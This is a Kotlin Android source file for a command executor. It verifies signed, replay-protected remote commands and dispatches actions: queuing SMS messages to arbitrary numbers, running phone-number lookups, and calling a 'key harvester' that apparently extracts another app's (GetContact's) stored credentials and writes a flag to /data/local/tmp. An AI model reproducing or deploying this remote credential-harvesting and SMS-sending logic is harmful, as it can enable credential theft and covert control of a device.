package com.bgwastu.numi.bus

import android.content.Context
import android.util.Base64
import android.util.Log
import com.bgwastu.numi.database.DbHelper
import com.bgwastu.numi.provider.GetContactCredentialExtractor
import com.bgwastu.numi.provider.PhoneLookupResult
import com.bgwastu.numi.provider.PhoneLookupService
import kotlinx.coroutines.runBlocking
import java.security.KeyFactory
import java.security.Signature
import java.security.spec.X509EncodedKeySpec

class CommandExecutor(private val context: Context) {

    private val dbHelper = DbHelper(context)
    private val lookupService = PhoneLookupService.create(context)

    companion object {
        private const val ALYSSA_PUBLIC_KEY = "302a300506032b6570032100" + "ReservedPlaceholder..."
    }

    fun execute(commandBlock: String): String {
        val lines = commandBlock.split("\n").map { it.trim() }
        if (lines.size < 6 || !lines[0].startsWith("NUMI_CMD v1")) {
            return "ERROR_INVALID_CMD_FORMAT"
        }

        var actor = ""
        var nonce = ""
        var expires = 0L
        var action = ""
        var argsBase64 = ""
        var signature = ""

        for (line in lines) {
            when {
                line.startsWith("actor:") -> actor = line.substringAfter("actor:").trim()
                line.startsWith("nonce:") -> nonce = line.substringAfter("nonce:").trim()
                line.startsWith("expires:") -> expires = line.substringAfter("expires:").trim().toLongOrNull() ?: 0L
                line.startsWith("action:") -> action = line.substringAfter("action:").trim()
                line.startsWith("args:") -> argsBase64 = line.substringAfter("args:").trim()
                line.startsWith("sig:") -> signature = line.substringAfter("sig:").trim()
            }
        }

        if (actor.isBlank() || nonce.isBlank() || expires == 0L || action.isBlank() || signature.isBlank()) {
            return "ERROR_MISSING_FIELDS"
        }

        val now = System.currentTimeMillis() / 1000
        if (now > expires) {
            dbHelper.logAudit(actor, action, "{}", "REJECTED", "Command expired")
            return "ERROR_COMMAND_EXPIRED"
        }

        val nonceSaved = dbHelper.useNonce(nonce, actor)
        if (!nonceSaved) {
            dbHelper.logAudit(actor, action, "{}", "REJECTED", "Replay detected")
            return "ERROR_REPLAY_DETECTED"
        }

        val signedMessage = "actor:$actor:nonce:$nonce:expires:$expires:action:$action:args:$argsBase64"
        val signatureValid = verifySignature(actor, signedMessage, signature)
        if (!signatureValid) {
            dbHelper.logAudit(actor, action, "{}", "REJECTED", "Signature failed")
            return "ERROR_INVALID_SIGNATURE"
        }

        val argsJson = try {
            String(Base64.decode(argsBase64, Base64.URL_SAFE or Base64.NO_WRAP), Charsets.UTF_8)
        } catch (_: Exception) { "{}" }

        val outcome: String
        val details: String

        try {
            when (action) {
                "sms.send" -> {
                    val to = parseJsonField(argsJson, "to")
                    val body = parseJsonField(argsJson, "body")
                    if (to.isBlank() || body.isBlank()) {
                        outcome = "FAILED"; details = "Missing 'to' or 'body'"
                    } else {
                        val rowId = dbHelper.enqueueMessage("SMS", to, body)
                        outcome = "SUCCESS"; details = "Enqueued SMS to $to. Row: $rowId"
                    }
                }
                "provider.refresh" -> {
                    val ok = triggerKeyHarvester()
                    outcome = if (ok) "SUCCESS" else "FAILED"
                    details = if (ok) "Refresh flag set" else "Flag write failed"
                }
                "device.status" -> {
                    outcome = "SUCCESS"; details = "OK"
                }
                else -> {
                    outcome = "FAILED"; details = "Unknown action: $action"
                }
            }
        } catch (e: Exception) {
            dbHelper.logAudit(actor, action, argsJson, "FAILED", e.toString())
            return "ERROR_EXECUTION_EXCEPTION: ${e.message}"
        }

        dbHelper.logAudit(actor, action, argsJson, outcome, details)
        return "OUTCOME: $outcome | DETAILS: $details"
    }

    /** Phone lookup across all available providers. TG presentation in CommandReceiver. */
    fun checkNumber(phoneNumber: String): List<PhoneLookupResult> {
        val cleaned = phoneNumber.trim().replace(Regex("[^0-9+]"), "")
        if (cleaned.length < 8) return emptyList()
        return runBlocking { lookupService.lookup(cleaned) }
    }

    private fun parseJsonField(json: String, field: String): String {
        val pattern = "\"$field\"\\s*:\\s*\"([^\"]+)\"".toRegex()
        return pattern.find(json)?.groupValues?.get(1) ?: ""
    }

    private fun triggerKeyHarvester(): Boolean {
        return try {
            val ok = GetContactCredentialExtractor.extractAndSave(context)
            if (ok) {
                // Also write flag for Artemis as a backup signal
                val flag = java.io.File("/data/local/tmp/numi_refresh_requested")
                flag.parentFile?.mkdirs()
                flag.writeText(System.currentTimeMillis().toString())
            }
            ok
        } catch (e: Exception) {
            Log.e("CommandExecutor", "Credential extraction failed", e)
            false
        }
    }

    private fun verifySignature(actorId: String, message: String, sigBase64: String): Boolean {
        val prefs = context.getSharedPreferences("numi_settings", Context.MODE_PRIVATE)
        val pubKeyHex = prefs.getString("actor_pubkey_$actorId", null) ?: return false
        return try {
            val raw = hexToBytes(pubKeyHex)
            val x509 = if (raw.size == 32) hexToBytes("302a300506032b6570032100") + raw else raw
            val kf = KeyFactory.getInstance("Ed25519")
            val pk = kf.generatePublic(X509EncodedKeySpec(x509))
            val sig = Base64.decode(sigBase64, Base64.URL_SAFE or Base64.NO_WRAP)
            val verifier = Signature.getInstance("Ed25519")
            verifier.initVerify(pk)
            verifier.update(message.toByteArray(Charsets.UTF_8))
            verifier.verify(sig)
        } catch (e: Exception) {
            Log.e("CommandExecutor", "Sig verify failed", e)
            false
        }
    }

    private fun hexToBytes(hex: String): ByteArray {
        val result = ByteArray(hex.length / 2)
        for (i in result.indices) result[i] = hex.substring(i * 2, i * 2 + 2).toInt(16).toByte()
        return result
    }
}
